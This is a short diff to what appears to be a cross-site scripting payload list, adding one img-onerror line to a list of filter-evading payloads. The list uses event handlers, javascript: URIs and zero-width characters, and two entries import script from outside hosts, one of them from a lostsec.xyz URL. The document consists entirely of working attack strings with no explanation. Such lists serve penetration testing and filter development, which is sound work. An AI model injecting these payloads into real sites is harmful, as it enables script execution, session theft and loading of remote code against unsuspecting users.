@@ -3,6 +3,7 @@ OnXSS=<Img/Src/OnError​=(alert)(1)>
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 <a onclick​="alert(1)">XSS</a>
 <svg onload​=alert(1)>
+"><img src="x:x" onerror=alert('xss')>
 <iframe src=javascript​:alert(1)>
 <body onload​=alert('XSS')>
 '"><svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
